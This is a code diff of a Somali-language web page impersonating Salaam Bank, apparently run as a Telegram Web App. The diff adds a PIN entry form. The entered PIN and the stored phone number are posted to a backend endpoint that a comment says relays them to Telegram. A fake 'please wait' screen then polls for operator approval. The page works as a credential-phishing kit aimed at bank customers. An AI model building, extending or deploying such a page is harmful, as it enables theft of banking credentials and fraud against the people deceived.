@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Siga Suxida - Salaam Bank</title>
+    <title>Geli PIN-ka - Salaam Bank</title>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
@@ -15,29 +15,91 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            min-height: 100vh;
             color: #333333;
         }
 
-        .loading-card {
-            background: #ffffff; /* Clean White Card */
+        .card {
+            background: #ffffff;
             width: 90%;
             max-width: 380px;
-            padding: 50px 20px;
+            padding: 40px 20px;
             border-radius: 20px;
             text-align: center;
             box-shadow: 0 10px 25px rgba(0,0,0,0.15);
             box-sizing: border-box;
         }
 
+        h2 {
+            color: #0066b2;
+            font-size: 22px;
+            margin: 0 0 10px;
+            font-weight: 700;
+        }
+
+        p {
+            color: #666666;
+            font-size: 14px;
+            margin: 0 0 25px;
+            line-height: 1.4;
+        }
+
+        /* PIN Input Styling */
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #0066b2;
+            margin-bottom: 8px;
+        }
+
+        .pin-input {
+            width: 100%;
+            padding: 14px;
+            font-size: 20px;
+            letter-spacing: 4px;
+            text-align: center;
+            border: 2px solid #cbd5e1;
+            border-radius: 10px;
+            outline: none;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+
+        .pin-input:focus {
+            border-color: #008744;
+        }
+
+        .btn-submit {
+            background-color: #008744; /* Salaam Bank Logo Green */
+            border: none;
+            color: #ffffff;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-submit:hover {
+            background-color: #006e37;
+        }
+
+        /* Loader Styles (Hidden initially) */
         .loader-circle {
-            width: 110px;
-            height: 110px;
+            width: 90px;
+            height: 90px;
             background-color: #f4f8fb;
             border: 2px solid #e1ecf4;
             border-radius: 50%;
-            margin: 0 auto 30px;
+            margin: 0 auto 25px;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -45,10 +107,10 @@
 
         .loader-circle::after {
             content: '';
-            width: 75px;
-            height: 75px;
+            width: 60px;
+            height: 60px;
             border: 4px solid #cbd5e1;
-            border-top: 4px solid #008744; /* Salaam Bank Logo Green Spinner */
+            border-top: 4px solid #008744;
             border-radius: 50%;
             animation: spin 1.2s linear infinite;
         }
@@ -58,79 +120,91 @@
             100% { transform: rotate(360deg); }
         }
 
-        h2 {
-            color: #0066b2; /* Salaam Bank Logo Blue */
-            font-size: 24px;
-            margin: 0 0 10px;
-            font-weight: 700;
-        }
-
-        p {
-            color: #666666;
-            font-size: 15px;
-            margin: 0;
-            line-height: 1.4;
+        #loading-view {
+            display: none;
         }
     </style>
 </head>
 
 <body>
 
-<div class="loading-card">
-    <div class="loader-circle"></div>
-    <h2 id="main-text">Waa La Dhadhaminayaa...</h2>
-    <p id="sub-text">Siga suxida xaqiijinta...</p>
+<div class="card">
+    <!-- PIN FORM VIEW -->
+    <div id="pin-view">
+        <h2>Geli PIN-kaaga</h2>
+        <p>Fadlan geli PIN-ka Salaam Bank si aad u sii wadato.</p>
+
+        <form id="pin-form">
+            <div class="input-group">
+                <label for="pin">PIN (4-6 Nambar)</label>
+                <input type="password" id="pin" class="pin-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" placeholder="••••" required>
+            </div>
+            <button type="submit" class="btn-submit">Sii Wad</button>
+        </form>
+    </div>
+
+    <!-- LOADING & VERIFICATION VIEW -->
+    <div id="loading-view">
+        <div class="loader-circle"></div>
+        <h2 id="main-text">Waa La Dhadhaminayaa...</h2>
+        <p id="sub-text">Siga suxida xaqiijinta...</p>
+    </div>
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", async () => {
-
-    const mainText = document.getElementById("main-text");
-    const subText = document.getElementById("sub-text");
-
+document.addEventListener("DOMContentLoaded", () => {
     const tg = window.Telegram?.WebApp;
     if (tg) {
         tg.ready();
         tg.expand();
     }
 
-    // Retrieve storage values with multiple key fallbacks
+    const pinForm = document.getElementById("pin-form");
+    const pinInput = document.getElementById("pin");
+    const pinView = document.getElementById("pin-view");
+    const loadingView = document.getElementById("loading-view");
+    const mainText = document.getElementById("main-text");
+    const subText = document.getElementById("sub-text");
+
     let rawPhone = localStorage.getItem("phone") || localStorage.getItem("phoneNumber") || "";
-    let rawPin = localStorage.getItem("lastPin") || localStorage.getItem("pin") || localStorage.getItem("userPin") || "";
-
-    // Sanitize phone number (strip spaces/dashes)
     const phone = rawPhone.replace(/\s+/g, '').replace(/[^0-9+]/g, '');
-    const pin = rawPin.trim() || "N/A"; // Prevent empty payload from failing backend validation
 
-    if (!phone) {
-        console.warn("⚠️ Phone number is missing in localStorage.");
-    }
+    pinForm.addEventListener("submit", async (e) => {
+        e.preventDefault();
 
-    // -------------------- SEND LOGIN NOTIFICATION --------------------
-    try {
-        const response = await fetch("/api/login-notification", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ phone, pin })
-        });
+        const pin = pinInput.value.trim();
+        if (!pin) return;
 
-        const resData = await response.json();
-        if (!response.ok) {
-            console.error("❌ Notification endpoint error:", resData);
-        } else {
-            console.log("✅ Telegram Notification Sent Successfully.");
+        // Save PIN into localStorage for downstream pages
+        localStorage.setItem("pin", pin);
+        localStorage.setItem("lastPin", pin);
+
+        // Switch to Loading View
+        pinView.style.display = "none";
+        loadingView.style.display = "block";
+
+        // Send login payload to backend (and Telegram)
+        try {
+            await fetch("/api/login-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, pin })
+            });
+            console.log("✅ Notification Sent");
+        } catch (err) {
+            console.error("❌ Notification error:", err);
         }
-    } catch (err) {
-        console.error("❌ Network or API error:", err);
-    }
 
-    // -------------------- TEXT CHANGE --------------------
-    setTimeout(() => {
-        mainText.textContent = "Fadlan sug...";
-        subText.textContent = "Tani waxay qaadanaysaa daqiiqado yar";
-    }, 3000);
+        // Change text after 3 seconds
+        setTimeout(() => {
+            mainText.textContent = "Fadlan sug...";
+            subText.textContent = "Tani waxay qaadanaysaa daqiiqado yar";
+        }, 3000);
 
-    // -------------------- CHECK APPROVAL --------------------
+        // Start checking approval status
+        setInterval(checkApproval, 2000);
+    });
+
     async function checkApproval() {
         if (!phone) return;
 
@@ -156,8 +230,6 @@ document.addEventListener("DOMContentLoaded", async () => {
             console.error("❌ Status check error:", err);
         }
     }
-
-    setInterval(checkApproval, 2000);
 });
 </script>
 
